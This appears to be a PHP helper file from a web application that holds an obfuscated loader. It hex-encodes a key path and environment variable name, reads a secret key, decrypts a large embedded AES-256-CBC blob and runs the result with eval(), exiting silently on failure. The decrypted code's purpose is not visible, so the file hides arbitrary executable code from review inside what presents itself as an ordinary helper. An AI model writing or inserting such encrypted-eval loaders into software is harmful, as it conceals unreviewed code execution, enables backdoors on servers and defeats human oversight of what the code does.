<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FEUf8M4DkTjNeHuiIRe4RQ==');

$c=base64_decode(

'ccigpY72khkrHNe+rvsKyUZJHVV36/bVUjoIyd6NNqvgWd4CbAt7S33W9tNPQCWgnHUxa+BdS4Fi' .
'b9wMfOGvWSgZCU1Kqq7jsBdQF6c2MO99JsEcLf3fQp4oLMK+1Zth5ZokdNooaqjpfDNIT07zNrK2' .
'BeuZtL5GudI61KOO+OnlUvqkJ1pTg62Fv5O19TQkFjPk0DEUhXeA/iY1aJ5qYbKu9L26QqOPg45d' .
'4J4OYrUQa6dhv5ekHpgwl0RxvogFTVNIyU5owrJ2uFMI3Ygkdw1OBjL0nmgnkMTLkVhSEEVxxB8A' .
'7dUyK75yEyKW2j41Ak+R7mt6ugwLBpMF3mIajngpTB5pcmbEGSvo/GmTw5o/EljUL4E5S3VjlyRQ' .
'TK2vrmrWjBk2vjYEw2JNg8sHnD0XAD5o+Qfpxg0JJroXiDTPyVYagOvVJZzvzd+Gol7tuJKS29zd' .
'Vy99lTfviON4eU85jOcqOEGMO3wHVNkPnDVG68dio6bCNp9KPvvXESJPwMBAXkd5mUdiz+k8c91S' .
'mYkmeczMv6qSqJvAClGRFaVjOXLvYbDioe5CI3Sjp+HLBfUhfIWvHl97mVX4AkzoPuTAn/jaUHrN' .
'CgjMKV8iWUnBJwU7lIkWoq3qFkgvDu6PEONlJDDLM88a7ZOJJsYoDrQLF2eTi3lpYQrkQWNR7WYl' .
'yhwrgmPCCzYUIdTgOUe8NeV+dkpQmIYYa7u2M7bzgm5vf9tUsJaM6LW/Hc7y/zMwHzNiQCKEqmnp' .
'UcoQoZNfgiua/K/rgqjafo/6XX7V/z1SY3+9sjzyxXAPEJB6Wfz76MCAEKtcg1YfrPDiklArtYMu' .
'9VeB0V6xqxCAHBx3o+OHFzJthrBlg46ShSDYTR6rZb8xLYplUSv9l/ohSSBWgrrXdMJ8TP3/F5KH' .
'sRb7YoV1bnDclICY7bQWmDKEBwV8+H8YHEiEksYLCK/V+DmlG9dviQ0Jbk2jrbUzyF7c1GFJBuG/' .
'nXVdbrrIcfPklyzf4s/wxvEze0YTnsln4xO1Zt7/6pt0p600+9JZdoz29lj9trvV9Y9qQc+xsI20' .
'kunDZeqek+qA/GSW0PNg8T9CH9DRyNp4b9lyiUU6AlgP75XQwmjzQoA6pPA1EX7JDzZ0QhRZpOyS' .
'EYmL4U+/amfC+ouDFRG5WVZcVL9xvDRsuOYJLwObVP7MsGiTZyFdvH8QYQzby0s/mnmiNivbR509' .
'ACO6rN3RptEM9e9ehhkTxCWrAQjZBx+yL3J5HrdQdLOt5ckH5gtxA0T84GQf61ffAmXtTnlD0k7y' .
'V6smaiuWYSpJVV4i3kTNhpM6wrGk1JH8HX/HrqsD+7cSdK9c5sFmxPz/g+Hd5AoyF5HHNP0BHclD' .
'iaz+OjeBOvQZQVYuMZLoI3FoualdhXtFFS1cIl/YD6KUK3Vxv5Rzm6E6SeNrYt++PjV0BUsGSnZZ' .
'ftPyLZUSIBUyzi5n6CyFM/nvnyB1IQL7cj+DlhiGiiRP52y94APr2R+69uuM8zftNXYXLftgEaCi' .
'khvP27ksxlJM3xYTK4lX5SPsMQiiwnDjr47qj5CpfjGgNYcxEjX8Mo8TqIXnKtdPzyiMnPGm7lLV' .
'S6chit5JAGkc0wMNHbKWlcBvKMWeBBpmTpQYMQhjltQGM72g9rbrXhLSDDhChHRiQkLgpM/QVrrl' .
'kDi36puAE9ee1R692dEHcXuNYvRWSI8yRgAnPLSWevNMrBtvQ8Q3HK4gLDF9zE73ah1+Emo6Z/iE' .
'xh1DdG3eW4/aDwpMXRjYk82AMQk96QdByYBbNPW5RG6a4SPFE9Y3cBoGoba43hLS32qZdAnB3sCI' .
'rBVutLBKEuGNEOsRJYlSOjYuIA7IxG3ac0WbIVEp8lbhkYlh+ww7uysN1YJoqr4kd9XEJVRfCVF3' .
'w3E+UeB+SrJagQIcpIoW4gNY8SUelx3n3kfmxGr135ycja7mXRaczC+qDNnvcQtXQTZRqDZw/PCN' .
'E+yzCGmwQMN8OSGqQ+XvJ4LDHWdso6+nfU26OZ0363AqbkNBmZsJtHuBnS5eMjFICQYAJk4snw3h' .
'yse8+iFHOzL+XP1NaulC3FB+8SQdDbYznMO5uyemM/LHz56KwH4DghnuCrwguzF1osFDNTotFZc3' .
'N0rJdxc3hpZsRDf6Lf7av4jWNFe8kNTRZt+XOwu53Iw+Q5et'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

